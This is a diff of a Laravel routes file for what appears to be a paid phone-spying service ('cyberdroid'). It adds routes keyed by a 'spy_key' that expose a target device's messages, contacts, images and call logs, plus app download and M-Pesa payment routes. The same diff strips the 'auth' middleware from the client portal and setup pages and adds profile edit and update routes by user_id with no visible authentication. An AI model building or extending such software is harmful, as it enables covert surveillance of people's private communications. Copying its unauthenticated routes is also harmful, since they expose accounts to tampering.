@@ -2,10 +2,15 @@
 
 use App\Http\Controllers\AdminLoginController;
 use App\Http\Controllers\AdminController;
+use App\Http\Controllers\CallLogsController;
 use App\Http\Controllers\ClientController;
 use App\Http\Controllers\ContactController;
+use App\Http\Controllers\ImagesController;
 use App\Http\Controllers\MessageController;
 use App\Http\Controllers\ClientLoginController;
+use App\Http\Controllers\MpesaController;
+use App\Http\Controllers\ProfileConroller;
+use App\Models\CallLogs;
 use Illuminate\Support\Facades\Route;
 
 /*
@@ -23,13 +28,6 @@ Route::get('/', function () {
     return view('welcome');
 });
 
-//users authentication
-Route::get('user/login', [ClientLoginController::class, 'show_login'])->name('show.login');
-Route::post('login', [ClientLoginController::class, 'login'])->name('user.login');
-Route::get('user/register', [ClientLoginController::class, 'show_register'])->name('show.register');
-Route::post('register', [ClientLoginController::class, 'register'])->name('user.register');
-Route::get('logout', [ClientLoginController::class, 'logout'])->name('user.logout');
-
 //admin authentication
 Route::get('admin/login', [AdminLoginController::class, 'admin_show_login'])->name('admin.show.login');
 Route::post('admin/login', [AdminLoginController::class, 'admin_login'])->name('admin.login');
@@ -46,13 +44,44 @@ Route::get('dashboard/messages/{device}', [AdminController::class, 'get_messages
 Route::get('dashboard/contacts', [AdminController::class, 'contacts'])->name('dashboard.contacts.index');
 Route::get('dashboard/contacts/{device}', [AdminController::class, 'get_contacts_by_device'])->name('dashboard.contacts.show');
 
+//users authentication
+Route::get('user/login', [ClientLoginController::class, 'show_login'])->name('show.login');
+Route::post('login', [ClientLoginController::class, 'login'])->name('user.login');
+Route::get('user/register', [ClientLoginController::class, 'show_register'])->name('show.register');
+Route::post('register', [ClientLoginController::class, 'register'])->name('user.register');
+Route::get('logout', [ClientLoginController::class, 'logout'])->name('user.logout');
+Route::get('user/forgot_pass', [ClientLoginController::class, 'show_forgot_pass_form'])->name('user.show.forgot_pass_form');
+Route::post('forgot_pass', [ClientLoginController::class, 'submit_forgot_pass_form'])->name('user.forgot_submit');
+Route::get('user/reset_pass/{token}', [ClientLoginController::class, 'show_reset_pass_form'])->name('user.show.reset_form');
+Route::post('reset_pass', [ClientLoginController::class, 'reset_pass'])->name('user.reset_pass');
+
+
 //client
-Route::get('portal', [ClientController::class, 'portal'])->name('portal')->middleware('auth');
-Route::get('setup', [ClientController::class, 'setup'])->name('setup')->middleware('auth');
+Route::get('portal', [ClientController::class, 'portal'])->name('portal');
+Route::get('setup', [ClientController::class, 'setup'])->name('setup');
+Route::put('setup/update/{user_id}', [ClientController::class, 'update_information'])->name('portal.setup.update');
+Route::put('setup/generate/{user_id}', [ClientController::class, 'generate_keys'])->name('portal.setup.generate');
+Route::post('setup/download/{user_id}', [ClientController::class, 'download_app'])->name('portal.setup.download');
+Route::get('mpesa/confirm/show', [ClientController::class, 'show_confirm'])->name('mpesa.confirm.show');
+Route::post('mpesa/confirm', [ClientController::class, 'confirm_payment'])->name('mpesa.confirm');
 
 //messages
-Route::get('messages/conversation/{phone_number}', [MessageController::class,'get_conversation'])->name('messages.conversation');
-Route::resource('messages', MessageController::class);
+Route::get('messages/conversation/{phone_number}/{spy_key}', [MessageController::class,'get_conversation'])->name('messages.conversation');
+Route::get('messages/{spy_key}', [MessageController::class, 'index'])->name('messages.index');
 
 //contacts
-Route::resource('contacts', ContactController::class);
+Route::get('contacts/{spy_key}', [ContactController::class,'index'])->name('contacts.index');
+
+//images
+Route::get('images/{spy_key}', [ImagesController::class, 'index'])->name('images.index');
+
+//call logs
+Route::get('call_logs/{spy_key}', [CallLogsController::class, 'index'])->name('call_logs.index');
+Route::get('call_logs/logs/{phone_number}/{spy_key}', [CallLogsController::class, 'get_logs'])->name('call_logs.logs');
+
+//user profile
+Route::get('profile/view/{user_id}', [ProfileConroller::class, 'view_profile'])->name('profile.view');
+Route::get('profile/edit/{user_id}', [ProfileConroller::class, 'edit_profile'])->name('profile.edit');
+Route::put('profile/update/{user_id}', [ProfileConroller::class, 'update_profile'])->name('profile.update');
+
+Route::post('cyberdroid/stk_push', [MpesaController::class, 'mpesa_stk_push'])->name('stk.push');
